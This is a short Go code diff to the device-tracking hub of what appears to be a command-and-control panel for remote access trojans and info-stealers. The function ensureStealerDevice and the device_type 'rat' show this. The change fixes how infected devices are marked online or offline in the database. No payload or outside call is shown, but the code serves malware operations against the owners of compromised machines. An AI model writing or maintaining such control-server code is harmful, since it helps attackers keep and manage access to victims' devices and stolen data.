@@ -110,6 +110,10 @@ func (h *Hub) RemoveDevice(id string) {
 			"type":      "device_disconnected",
 			"device_id": id,
 		})
+	} else {
+		// Device disconnected before being added to the in-memory map (connect race window).
+		// Still mark offline in DB so it doesn't get stuck online.
+		db.DB.Exec(`UPDATE devices SET is_online = 0, last_seen = CURRENT_TIMESTAMP WHERE device_id = ?`, id)
 	}
 }
 
@@ -739,7 +743,7 @@ func ensureStealerDevice(deviceID, teamID string) {
 		)
 		return
 	}
-	db.DB.Exec(`UPDATE devices SET team_id = ?, is_online = 1, last_seen = CURRENT_TIMESTAMP WHERE device_id = ? AND COALESCE(deleted,0) = 0`, teamID, deviceID)
+	db.DB.Exec(`UPDATE devices SET team_id = ?, last_seen = CURRENT_TIMESTAMP WHERE device_id = ? AND COALESCE(deleted,0) = 0`, teamID, deviceID)
 }
 
 func ensureDeviceExists(deviceID, teamID string, width, height int) {
@@ -761,7 +765,7 @@ func ensureDeviceExists(deviceID, teamID string, width, height int) {
 
 	// Do NOT overwrite permissions — they are set by the device via HTTP registration.
 	db.DB.Exec(
-		`UPDATE devices SET team_id = ?, is_online = 1, device_type = 'rat', last_seen = CURRENT_TIMESTAMP WHERE device_id = ? AND COALESCE(deleted,0) = 0`,
+		`UPDATE devices SET team_id = ?, device_type = 'rat', last_seen = CURRENT_TIMESTAMP WHERE device_id = ? AND COALESCE(deleted,0) = 0`,
 		teamID, deviceID,
 	)
 }
